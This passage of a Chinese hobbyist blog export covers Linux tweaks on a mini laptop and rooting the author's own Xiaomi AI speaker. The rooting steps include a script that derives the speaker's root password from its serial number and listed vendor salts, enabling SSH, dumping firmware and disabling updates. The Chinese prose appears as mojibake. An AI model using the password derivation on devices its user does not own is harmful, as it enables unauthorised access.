<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Screen_rotate.sh  written by badb100d</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">portrait (left)</span></span><br><span class="line">export DISPLAY=:0</span><br><span class="line">xrandr --output eDP-1 --rotate left</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 15 is the touch screen id</span></span><br><span class="line">xinput set-prop 15 --type=float &quot;Coordinate Transformation Matrix&quot; 0 -1 1 1 0 0 0 0 1</span><br></pre></td></tr></table></figure>



<h2 id="é™„åŠ "><a href="#é™„åŠ " class="headerlink" title="é™„åŠ "></a>é™„åŠ </h2><h3 id="å¢å¤§grubå­—ä½“"><a href="#å¢å¤§grubå­—ä½“" class="headerlink" title="å¢å¤§grubå­—ä½“"></a>å¢å¤§grubå­—ä½“</h3><p>grub è²Œä¼¼æ˜¯æ²¡æ³•æ—‹è½¬çš„ï¼ˆé™¤épatch binaryï¼‰ï¼Œæ‰€ä»¥å°†å°±ä¸€ä¸‹è¿™ä¸ªé¢ˆæ¤ç—…åº·å¤ç‰ˆgrubã€‚ä¸è¿‡grubçš„å­—ä½“è¿˜æ˜¯å¯ä»¥è°ƒçš„ï¼Œé»˜è®¤å­—å·å¤ªå°ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# apt install ttf-unifont -y</span><br><span class="line">root@One-Mix3-Pro:~# grub-mkfont -s 32 -o /boot/grub/fonts/unicode32.pf2 /usr/share/fonts/truetype/unifont/unifont.ttf</span><br><span class="line">root@One-Mix3-Pro:~# vim /etc/default/grub     # å¢åŠ  GRUB_FONT=/boot/grub/fonts/unicode32.pf2</span><br><span class="line">root@One-Mix3-Pro:~# update-grub							 # æ›´æ–°grubï¼Œå†é‡å¯</span><br></pre></td></tr></table></figure>



<h3 id="ä¿®æ”¹-tty-ä¸‹æ—‹è½¬æ¨¡å¼"><a href="#ä¿®æ”¹-tty-ä¸‹æ—‹è½¬æ¨¡å¼" class="headerlink" title="ä¿®æ”¹ tty ä¸‹æ—‹è½¬æ¨¡å¼"></a>ä¿®æ”¹ tty ä¸‹æ—‹è½¬æ¨¡å¼</h3><p>GUIä¸‹çš„å±å¹•æ—‹è½¬è§£å†³äº†ï¼Œä½†æ˜¯æœ‰æ—¶å€™çº¯CUIæ“ä½œæ•ˆç‡æ›´é«˜ï¼Œä¹Ÿæ›´èŠ‚çº¦èµ„æºã€‚é»˜è®¤çš„ tty ç•Œé¢ï¼ˆctrl+alt+F3ï¼‰ä¹Ÿæ˜¯æ—‹è½¬çš„ï¼Œé€šè¿‡ä¿®æ”¹ grub å¯åŠ¨å‚æ•°è¿›è¡Œæ ¡æ­£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat &#x2F;etc&#x2F;default&#x2F;grub</span><br><span class="line"># If you change this file, run &#39;update-grub&#39; afterwards to update</span><br><span class="line"># &#x2F;boot&#x2F;grub&#x2F;grub.cfg.</span><br><span class="line"># For full documentation of the options in this file, see:</span><br><span class="line">#   info -f grub -n &#39;Simple configuration&#39;</span><br><span class="line"></span><br><span class="line">GRUB_DEFAULT&#x3D;0</span><br><span class="line">GRUB_TIMEOUT_STYLE&#x3D;hidden</span><br><span class="line">GRUB_TIMEOUT&#x3D;2</span><br><span class="line">GRUB_FONT&#x3D;&#x2F;boot&#x2F;grub&#x2F;fonts&#x2F;unicode32.pf2</span><br><span class="line">GRUB_DISTRIBUTOR&#x3D;&#96;lsb_release -i -s 2&gt; &#x2F;dev&#x2F;null || echo Debian&#96;</span><br><span class="line">#GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet splash&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;video&#x3D;efifb fbcon&#x3D;rotate:3 fbcon&#x3D;rotate_all:1 quiet splash&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX&#x3D;&quot;net.ifnames&#x3D;0 biosdevname&#x3D;0 video&#x3D;efifb fbcon&#x3D;rotate:3 fbcon&#x3D;rotate_all:1&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to enable BadRAM filtering, modify to suit your needs</span><br><span class="line"># This works with Linux (no patch required) and with any kernel that obtains</span><br><span class="line"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span><br><span class="line">#GRUB_BADRAM&#x3D;&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to disable graphical terminal (grub-pc only)</span><br><span class="line">#GRUB_TERMINAL&#x3D;console</span><br><span class="line"></span><br><span class="line"># The resolution used on graphical terminal</span><br><span class="line"># note that you can use only modes which your graphic card supports via VBE</span><br><span class="line"># you can see them in real GRUB with the command &#96;vbeinfo&#39;</span><br><span class="line">#GRUB_GFXMODE&#x3D;640x480</span><br><span class="line"></span><br><span class="line"># Uncomment if you don&#39;t want GRUB to pass &quot;root&#x3D;UUID&#x3D;xxx&quot; parameter to Linux</span><br><span class="line">#GRUB_DISABLE_LINUX_UUID&#x3D;true</span><br><span class="line"></span><br><span class="line"># Uncomment to disable generation of recovery mode menu entries</span><br><span class="line">#GRUB_DISABLE_RECOVERY&#x3D;&quot;true&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to get a beep at grub start</span><br><span class="line">#GRUB_INIT_TUNE&#x3D;&quot;480 440 1&quot;</span><br></pre></td></tr></table></figure>

<p>æ›´æ–° grub å¹¶é‡å¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# update-grub</span><br></pre></td></tr></table></figure>



<h3 id="å¢åŠ -tty-ä¸‹ä¸­æ–‡å­—ç¬¦æ”¯æŒ"><a href="#å¢åŠ -tty-ä¸‹ä¸­æ–‡å­—ç¬¦æ”¯æŒ" class="headerlink" title="å¢åŠ  tty ä¸‹ä¸­æ–‡å­—ç¬¦æ”¯æŒ"></a>å¢åŠ  tty ä¸‹ä¸­æ–‡å­—ç¬¦æ”¯æŒ</h3><p>å®‰è£…<code>fbterm</code>ï¼Œé…ç½®<code>~/.fbtermrc</code>ï¼Œrootå’Œæ™®é€šç”¨æˆ·éƒ½é…ç½®ä¸€ä¸‹ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">font-names=Ubuntu Mono</span><br><span class="line">font-size=40</span><br><span class="line">screen-rotate=3</span><br></pre></td></tr></table></figure>

<p>é…ç½®<code>fbterm</code>æƒé™</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setcap &#x27;cap_sys_tty_config+ep&#x27; /usr/bin/fbterm</span><br></pre></td></tr></table></figure>



<h3 id="å¢åŠ -rc-local-æ”¯æŒ"><a href="#å¢åŠ -rc-local-æ”¯æŒ" class="headerlink" title="å¢åŠ  rc.local æ”¯æŒ"></a>å¢åŠ  rc.local æ”¯æŒ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/systemd/system/rc-local.service</span><br><span class="line">[Unit]</span><br><span class="line"> Description=/etc/rc.local Compatibility</span><br><span class="line"> ConditionPathExists=/etc/rc.local</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"> Type=forking</span><br><span class="line"> ExecStart=/etc/rc.local start</span><br><span class="line"> TimeoutSec=0</span><br><span class="line"> StandardOutput=tty</span><br><span class="line"> RemainAfterExit=yes</span><br><span class="line"> SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"> WantedBy=multi-user.target</span><br><span class="line"> </span><br><span class="line">root@One-Mix3-Pro:~# systemctl enable rc-local; touch /etc/rc.local; chmod +x /etc/rc.local</span><br></pre></td></tr></table></figure>



<h3 id="æ— çº¿ç½‘å¡ä¸ä¼‘çœ "><a href="#æ— çº¿ç½‘å¡ä¸ä¼‘çœ " class="headerlink" title="æ— çº¿ç½‘å¡ä¸ä¼‘çœ "></a>æ— çº¿ç½‘å¡ä¸ä¼‘çœ </h3><p>æŸ¥çœ‹ï¼Œå¹¶ä¿®æ”¹æ— çº¿ç½‘å¡çŠ¶æ€ï¼ˆé‡å¯å¤±æ•ˆï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# iw dev wlan0 get power_save</span><br><span class="line">Power save: on</span><br><span class="line">root@One-Mix3-Pro:~# iw dev wlan0 set power_save off</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹æ— çº¿ç½‘å¡é…ç½®ï¼ˆé‡å¯ä¸å¤±æ•ˆï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line">[connection]</span><br><span class="line">wifi.powersave = 2</span><br></pre></td></tr></table></figure>



<h3 id="å®‰è£…VNCï¼ˆç³»ç»Ÿè‡ªå¸¦çš„å¤ªè¾£é¸¡ï¼‰"><a href="#å®‰è£…VNCï¼ˆç³»ç»Ÿè‡ªå¸¦çš„å¤ªè¾£é¸¡ï¼‰" class="headerlink" title="å®‰è£…VNCï¼ˆç³»ç»Ÿè‡ªå¸¦çš„å¤ªè¾£é¸¡ï¼‰"></a>å®‰è£…VNCï¼ˆç³»ç»Ÿè‡ªå¸¦çš„å¤ªè¾£é¸¡ï¼‰</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# wget https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.7.2-Linux-x64.deb</span><br><span class="line">root@One-Mix3-Pro:~# dpkg -i VNC-Server-6.7.2-Linux-x64.deb</span><br></pre></td></tr></table></figure>

<h3 id="ç›’ç›–ä¸ä¼‘çœ "><a href="#ç›’ç›–ä¸ä¼‘çœ " class="headerlink" title="ç›’ç›–ä¸ä¼‘çœ "></a>ç›’ç›–ä¸ä¼‘çœ </h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# echo &quot;HandleLidSwitchExternalPower=ignore&quot; &gt;&gt; /etc/systemd/logind.conf</span><br><span class="line">root@One-Mix3-Pro:~# systemctl restart systemd-logind</span><br></pre></td></tr></table></figure>

<p>å†è£…äº›æœ‰çš„æ²¡çš„å¸¸ç”¨è½¯ä»¶ï¼Œå·®ä¸å¤šåŸºæœ¬é…ç½®å°±OKäº†ï¼Œåé¢å„ä¸ªç¯å¢ƒå…¨éƒ¨dockeråŒ–å§ï¼ŒUbuntuç¯å¢ƒä¹±äº†å¾ˆéš¾å—ã€‚</p>
<h2 id="åç»­æ›´æ–°"><a href="#åç»­æ›´æ–°" class="headerlink" title="åç»­æ›´æ–°"></a>åç»­æ›´æ–°</h2><h3 id="2021-08-07"><a href="#2021-08-07" class="headerlink" title="2021-08-07"></a>2021-08-07</h3><ul>
<li>æœ€è¿‘è®¾å¤‡ç»å¸¸é«˜æ¸©é‡å¯ï¼Œä»<code>https://extensions.gnome.org/extension/945/cpu-power-manager/</code>å¤„æ·»åŠ gnomeæ’ä»¶æ§åˆ¶CPUé¢‘ç‡ï¼Œå¦å¤–åç»­å¯ä»¥çœ‹ä¸€ä¸‹<code>/sys/devices/virtual/thermal/cooling_device\*</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:/# for i in `ls /sys/devices/virtual/thermal`;do cat /sys/devices/virtual/thermal/$i/type;done</span><br><span class="line">Fan</span><br><span class="line">Fan</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">intel_powerclamp</span><br><span class="line">Fan</span><br><span class="line">Fan</span><br><span class="line">Fan</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">INT3400 Thermal</span><br><span class="line">SEN3</span><br><span class="line">pch_skylake</span><br><span class="line">B0D4</span><br><span class="line">iwlwifi_1</span><br><span class="line">x86_pkg_temp</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>å°ç±³AIéŸ³ç®±(å°çˆ±åŒå­¦)rootè®°å½•</title>
    <url>/2020/12/01/2020-12-01/</url>
    <content><![CDATA[<p>æœ€è¿‘è®¡åˆ’æä¸€ææ™ºèƒ½éŸ³ç®±ï¼Œä»ç½‘ä¸Šä¹°äº†ä¸€ä¸ªäºŒæ‰‹çš„å°ç±³AIéŸ³ç®±ï¼ˆå‹å·MDZ-25-DAï¼‰</p>
<img src="/2020/12/01/2020-12-01/xiaomi-ai.jpg" class="">

<p>æ‹†å¼€çœ‹æ˜¯ç»¿æ¿ä¸»æ¿ï¼Œåº”è¯¥æ˜¯åæ–°çš„æ‰¹æ¬¡ï¼Œä¸»æ¿å¤–è§‚å¦‚ä¸‹å›¾ï¼š</p>
<img src="/2020/12/01/2020-12-01/green-board.jpg" class="">

<p>å‚è€ƒ<span class="exturl" data-url="aHR0cHM6Ly9iYnMuaGFzc2JpYW4uY29tL2ZvcnVtLnBocD9tb2Q9dmlld3RocmVhZCZ0aWQ9ODc1NCZwYWdlPTE=" title="https://bbs.hassbian.com/forum.php?mod=viewthread&tid=8754&page=1">hassbian<i class="fa fa-external-link"></i></span>çš„æ–¹æ³•å¯¹è®¾å¤‡è¿›è¡Œrootï¼Œè®°å½•ä¸€ä¸‹ã€‚</p>
<h3 id="1-æ‹†æœºä¸²å£ç™»å½•"><a href="#1-æ‹†æœºä¸²å£ç™»å½•" class="headerlink" title="1. æ‹†æœºä¸²å£ç™»å½•"></a>1. æ‹†æœºä¸²å£ç™»å½•</h3><p>ä»ç½‘ä¸Šæ‰¾äº†å‡ ä¸ªæ‹†è§£å›¾ï¼ŒåŸºæœ¬çŸ¥é“èºä¸ä½ç½®åï¼Œæ­£å¸¸è¿›è¡Œæ‹†è§£å°±è¡Œã€‚è°ƒè¯•ä¸²å£ä¸ºé—´è· 1mm çš„ 3pin å£ï¼Œæ·˜å®ä¹°äº†æ ¹ SH 1.0mm 3pin çº¿ï¼Œå†ç„Šæ¥3æ ¹æœé‚¦çº¿æ¥åˆ° USB2TTL è®¾å¤‡ä¸Šï¼Œæ³¢ç‰¹ç‡ 115200 è¿›å…¥ ttyï¼Œè¾“å…¥ä»»æ„é”®ï¼Œå¼¹å‡º root ç™»å½•æç¤ºã€‚</p>
<p>è¿™ä¸ª root å¯†ç å’Œ kindle çš„ root å¯†ç æŒºåƒçš„ï¼Œæ ¹æ®ä¸²å·åŠ å›ºå®šå­—ç¬¦ä¸²ç®—å‡ºæ¥çš„ï¼Œæœ‰ç‚¹HMACçš„æ„æ€ã€‚</p>
<p>ç½‘ä¸ŠæŸ¥æ‰¾äº†ä¸€äº›èµ„æ–™ï¼Œæ‰¾åˆ°å‡ ä¸ªå­—ç¬¦ä¸²ï¼Œç»è¿‡æµ‹è¯•æˆ‘çš„è®¾å¤‡å¯¹åº”å­—ç¬¦ä¸²æ˜¯<code>B0168A6D-119A-F21A-DA58-980732F80A19</code>ã€‚</p>
<p>å¤§è‡´ç®—æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šç”¨è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment"># 1ã€å…ˆæ‰¾åˆ°å°çˆ±éŸ³å“SNç ï¼Œé€šå¸¸åœ¨æ‹†å¼€åçš„åº•åº§é‡Œé¢ã€‚</span></span><br><span class="line"><span class="comment"># ä¾‹å¦‚ï¼šSNï¼š20190/122119360</span></span><br><span class="line"><span class="comment"># 2ã€rootç™»å½•å¯†ç =md5(SN+é€šé…å­—ç¬¦ä¸²)å–å€¼çš„å‰14ä½</span></span><br><span class="line"><span class="comment"># é€šé…å­—ç¬¦ä¸²ï¼š9C78089F-83C7-3CDC-BCC9-93B378868E7F</span></span><br><span class="line"><span class="comment"># å³ï¼š20190/1221193609C78089F-83C7-3CDC-BCC9-93B378868E7F</span></span><br><span class="line"><span class="comment"># 3ã€ä½¿ç”¨MD5åœ¨çº¿åŠ å¯†å·¥å…· https://md5jiami.51240.com/</span></span><br><span class="line"><span class="comment"># 4ã€å°†2ä¸­çš„æœ€ç»ˆå¾…åŠ å¯†ä»£ç ç»md5åŠ å¯†åå¾—åˆ°å¦‚ä¸‹32ä½å°å†™åŠ å¯†ä¿¡æ¯ï¼šï¼ˆåªçœ‹32ä½ï¼Œä¸”ä¸€å®šå°å†™ï¼‰</span></span><br><span class="line"><span class="comment"># 865027665beacb8f8240355d7300e0ac</span></span><br><span class="line"><span class="comment"># å–å‰14ä½ï¼š865027665beacb å³ä¸ºrootç™»é™†å¯†ç </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">MAGIC_SALTS = [\</span><br><span class="line">               <span class="string">&quot;5775B10D-15C0-7827-97B9-88EA07FCA97A&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;0168A6D-119A-F21A-DA58-980732F80A19&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;A20EDC68-62E5-70C6-76E8-75879721B8EC&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;B0168A6D-119A-F21A-DA58-980732F80A19&quot;</span>,\</span><br><span class="line">              ]</span><br><span class="line">sn = <span class="string">&quot;1****/9********&quot;</span></span><br><span class="line">root_password = md5( sn + MAGIC_SALTS[<span class="number">3</span>] ).lower()[:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span> root_password</span><br></pre></td></tr></table></figure>

<h3 id="2-ä¸´æ—¶æ‰“å¼€ssh"><a href="#2-ä¸´æ—¶æ‰“å¼€ssh" class="headerlink" title="2. ä¸´æ—¶æ‰“å¼€ssh"></a>2. ä¸´æ—¶æ‰“å¼€ssh</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12A:~# dropbearkey -t rsa -f /data/dropbear_rsa_host_key</span><br><span class="line">root@S12A:~# dropbear -r /data/dropbear_rsa_host_key</span><br><span class="line">root@S12A:~# ifconfig</span><br></pre></td></tr></table></figure>

<p>ç„¶åé€šè¿‡ ssh è¿å…¥è®¾å¤‡ï¼Œç•Œé¢ä¸Šä¼šæ¯”USB2TTLçš„CUIæ›´å®Œå–„ä¸€äº›ã€‚</p>
<h3 id="3-æå–æ–‡ä»¶ç³»ç»Ÿ"><a href="#3-æå–æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="3. æå–æ–‡ä»¶ç³»ç»Ÿ"></a>3. æå–æ–‡ä»¶ç³»ç»Ÿ</h3><p><code>mount</code>çœ‹ä¸€ä¸‹ç›®å‰æŒ‚è½½çš„åˆ†åŒºï¼Œå¦å¤–å¯ä»¥<code>ls -alF /dev/mtd*</code>çœ‹çœ‹è¿˜æœ‰å“ªäº›å…¶ä»–åˆ†åŒºï¼Œç»¿æ¿å°çˆ±åŒå­¦æœ‰a/båˆ†åŒºå¤‡ä»½ï¼Œå»ºè®®å…ˆåˆ·1ä¸ªåˆ†åŒºï¼Œå¦‚æœèƒ½å¤Ÿæ­£å¸¸å¯åŠ¨çš„è¯ï¼Œå†æŠŠå¦ä¸€ä¸ªåˆ†åŒºåˆ·äº†ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12A:~# mount</span><br><span class="line">/dev/mtdblock4 on / type squashfs (ro,noatime)</span><br><span class="line">proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noatime)</span><br><span class="line">tmpfs on /dev type tmpfs (rw,nosuid,relatime,size=512k,mode=755)</span><br><span class="line">devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,mode=600,ptmxmode=000)</span><br><span class="line">debugfs on /sys/kernel/debug type debugfs (rw,noatime)</span><br><span class="line">pstore on /sys/fs/pstore type pstore (rw,relatime)</span><br><span class="line">/dev/ubi0_0 on /data type ubifs (rw,relatime)</span><br><span class="line">/dev/ubi0_0 on /etc/shadow type ubifs (rw,relatime)</span><br><span class="line">root@S12A:~# ll /dev/mtd*</span><br><span class="line">crw-------    1 root     root       90,   0 Jan  1  2015 /dev/mtd0</span><br><span class="line">crw-------    1 root     root       90,   1 Jan  1  2015 /dev/mtd0ro</span><br><span class="line">crw-------    1 root     root       90,   2 Jan  1  2015 /dev/mtd1</span><br><span class="line">crw-------    1 root     root       90,   3 Jan  1  2015 /dev/mtd1ro</span><br><span class="line">crw-------    1 root     root       90,   4 Jan  1  2015 /dev/mtd2</span><br><span class="line">crw-------    1 root     root       90,   5 Jan  1  2015 /dev/mtd2ro</span><br><span class="line">crw-------    1 root     root       90,   6 Jan  1  2015 /dev/mtd3</span><br><span class="line">crw-------    1 root     root       90,   7 Jan  1  2015 /dev/mtd3ro</span><br><span class="line">crw-------    1 root     root       90,   8 Jan  1  2015 /dev/mtd4</span><br><span class="line">crw-------    1 root     root       90,   9 Jan  1  2015 /dev/mtd4ro</span><br><span class="line">crw-------    1 root     root       90,  10 Jan  1  2015 /dev/mtd5</span><br><span class="line">crw-------    1 root     root       90,  11 Jan  1  2015 /dev/mtd5ro</span><br><span class="line">crw-------    1 root     root       90,  12 Jan  1  2015 /dev/mtd6</span><br><span class="line">crw-------    1 root     root       90,  13 Jan  1  2015 /dev/mtd6ro</span><br><span class="line">brw-------    1 root     root       31,   0 Jan  1  2015 /dev/mtdblock0</span><br><span class="line">brw-------    1 root     root       31,   1 Jan  1  2015 /dev/mtdblock1</span><br><span class="line">brw-------    1 root     root       31,   2 Jan  1  2015 /dev/mtdblock2</span><br><span class="line">brw-------    1 root     root       31,   3 Jan  1  2015 /dev/mtdblock3</span><br><span class="line">brw-------    1 root     root       31,   4 Jan  1  2015 /dev/mtdblock4</span><br><span class="line">brw-------    1 root     root       31,   5 Jan  1  2015 /dev/mtdblock5</span><br><span class="line">brw-------    1 root     root       31,   6 Jan  1  2015 /dev/mtdblock6</span><br></pre></td></tr></table></figure>

<p>åˆ‡åˆ°/tmpä¸´æ—¶ç›®å½•ï¼Œå¯¹ç³»ç»Ÿé•œåƒè¿›è¡Œæå–</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12A:~# cd /tmp</span><br><span class="line">root@S12A:/tmp# dd if=/dev/mtdblock4 of=/tmp/m4.img</span><br><span class="line">65536+0 records in</span><br><span class="line">65536+0 records out</span><br></pre></td></tr></table></figure>

<p>scp æŠŠ m4.img å¤åˆ¶åˆ°å¦ä¸€å° Linux æœºå™¨ï¼Œå†å›æ¥æŠŠ /tmp/m4.img åˆ é™¤ï¼Œé‡æ–° dd mtdblock5 å‡ºæ¥åšä¸ªbåˆ†åŒºå¤‡ä»½ã€‚</p>
<h3 id="4-è§£å‹å¹¶ä¿®æ”¹åˆ†åŒº"><a href="#4-è§£å‹å¹¶ä¿®æ”¹åˆ†åŒº" class="headerlink" title="4. è§£å‹å¹¶ä¿®æ”¹åˆ†åŒº"></a>4. è§£å‹å¹¶ä¿®æ”¹åˆ†åŒº</h3><h4 id="4-1-è§£å‹åˆ†åŒº"><a href="#4-1-è§£å‹åˆ†åŒº" class="headerlink" title="4.1 è§£å‹åˆ†åŒº"></a>4.1 è§£å‹åˆ†åŒº</h4><p>åœ¨ Linux æœºå™¨ä¸Šè§£å‹æå–åˆ°çš„ m4.img é•œåƒï¼ŒæŸ¥çœ‹ block sizeï¼Œåé¢é‡æ–°å‹ç¼©ä¼šç”¨åˆ°ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# unsquashfs -s mtdblock4.img</span><br><span class="line">Found a valid SQUASHFS 4:0 superblock on mtdblock4.img.</span><br><span class="line">Creation or last append time Thu Jul 16 13:04:11 2020</span><br><span class="line">Filesystem size 32052.31 Kbytes (31.30 Mbytes)</span><br><span class="line">Compression xz</span><br><span class="line">xz: error reading stored compressor options from filesystem!</span><br><span class="line">Block size 131072</span><br><span class="line">Filesystem is exportable via NFS</span><br><span class="line">Inodes are compressed</span><br><span class="line">Data is compressed</span><br><span class="line">Fragments are compressed</span><br><span class="line">Always-use-fragments option is not specified</span><br><span class="line">Xattrs are not stored</span><br><span class="line">Duplicates are removed</span><br><span class="line">Number of fragments 106</span><br><span class="line">Number of inodes 1763</span><br><span class="line">Number of ids 1</span><br></pre></td></tr></table></figure>

<p>è§£å‹é•œåƒï¼Œ<strong>æ³¨æ„è¿™é‡Œéœ€è¦ç”¨ root è§£å‹ï¼Œé root è´¦æˆ·å¯èƒ½æ— æ³•åˆ›å»ºè®¾å¤‡æ–‡ä»¶ç­‰ç‰¹æ®Šæ–‡ä»¶ï¼Œé‡æ–°æ‰“åŒ…åˆ·å…¥åï¼Œç³»ç»Ÿä¼šèµ·ä¸æ¥</strong>ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# unsquashfs -dest m4 mtdblock4.img</span><br><span class="line">Parallel unsquashfs: Using 4 processors</span><br><span class="line">1661 inodes (2074 blocks) to write</span><br><span class="line"></span><br><span class="line">[======================================================/] 2074/2074 100%</span><br><span class="line"></span><br><span class="line">created 1082 files</span><br><span class="line">created 102 directories</span><br><span class="line">created 578 symlinks</span><br><span class="line">created 1 devices</span><br><span class="line">created 0 fifos</span><br></pre></td></tr></table></figure>

<h4 id="4-2-æ·»åŠ è‡ªå¯åŠ¨é¡¹"><a href="#4-2-æ·»åŠ è‡ªå¯åŠ¨é¡¹" class="headerlink" title="4.2 æ·»åŠ è‡ªå¯åŠ¨é¡¹"></a>4.2 æ·»åŠ è‡ªå¯åŠ¨é¡¹</h4><p>ä¿®æ”¹ /etc/rc.local æ·»åŠ  /data/init.shï¼ˆæˆ–è€…æŠŠè‡ªå¯åŠ¨çš„å‘½ä»¤éƒ½å†™å…¥rc.localä¹Ÿè¡Œï¼Œåæ­£é•œåƒéƒ½æ”¹å†™äº†ï¼‰ï¼Œæ”¹å®Œçš„æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<h5 id="rc-local"><a href="#rc-local" class="headerlink" title="rc.local"></a>rc.local</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# cat m4/etc/rc.local</span><br><span class="line"><span class="meta">#</span><span class="bash"> the system init finished. By default this file does nothing.</span></span><br><span class="line">sh /data/init.sh &amp;</span><br><span class="line">exit 0</span><br><span class="line">root@ubuntu:/home/test/Desktop/xiaomi#</span><br></pre></td></tr></table></figure>

<h5 id="data-init-sh"><a href="#data-init-sh" class="headerlink" title="/data/init.sh"></a>/data/init.sh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12A:~# chmod +x /data/init.sh					# æ·»åŠ å¯æ‰§è¡Œå±æ€§</span><br><span class="line">root@S12A:~# ll /data/init.sh					</span><br><span class="line">-rwxr-xr-x    1 root     root           188 Dec 24  2019 /data/init.sh*</span><br><span class="line">root@S12A:~# cat /data/init.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">if [ -e /data/dropbear_rsa_host_key ]</span><br><span class="line">then</span><br><span class="line">  echo &quot;exists&quot;</span><br><span class="line">else</span><br><span class="line">  echo &quot;not exist&quot;</span><br><span class="line">  dropbearkey -t rsa -f /data/dropbear_rsa_host_key</span><br><span class="line">fi</span><br><span class="line">dropbear -r /data/dropbear_rsa_host_key</span><br></pre></td></tr></table></figure>

<h4 id="4-3-å†™å…¥-ssh-å¯†é’¥"><a href="#4-3-å†™å…¥-ssh-å¯†é’¥" class="headerlink" title="4.3 å†™å…¥ ssh å¯†é’¥"></a>4.3 å†™å…¥ ssh å¯†é’¥</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:~# cat /etc/dropbear/authorized_keys</span><br><span class="line">ssh-rsa AAA**************************************************</span><br></pre></td></tr></table></figure>

<h4 id="4-4-å…³é—­-OTA"><a href="#4-4-å…³é—­-OTA" class="headerlink" title="4.4 å…³é—­ OTA"></a>4.4 å…³é—­ OTA</h4><p>ä¿®æ”¹ crontab æ–‡ä»¶ï¼Œå…³é—­ OTA æ£€æŸ¥ï¼Œä»¥é˜²ç³»ç»Ÿæ›´æ–°åè‡ªå¯åŠ¨é¡¹ &amp; ssh å¯†é’¥æ¶ˆå¤±ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:~# cat /etc/crontabs/root</span><br><span class="line"><span class="meta">#</span><span class="bash"> explain crontab <span class="keyword">in</span> https://crontab.guru/</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> At every 5th minute.</span></span><br><span class="line">*/5 * * * * /usr/sbin/easy_logcut size</span><br><span class="line"><span class="meta">#</span><span class="bash"> At every minute.</span></span><br><span class="line">* * * * * /usr/sbin/network_probe.sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> At 04:32.</span></span><br><span class="line">32 4 * * * /usr/sbin/pns refresh</span><br><span class="line"><span class="meta">#</span><span class="bash"> At every 10th minute.</span></span><br><span class="line">*/10 * * * * 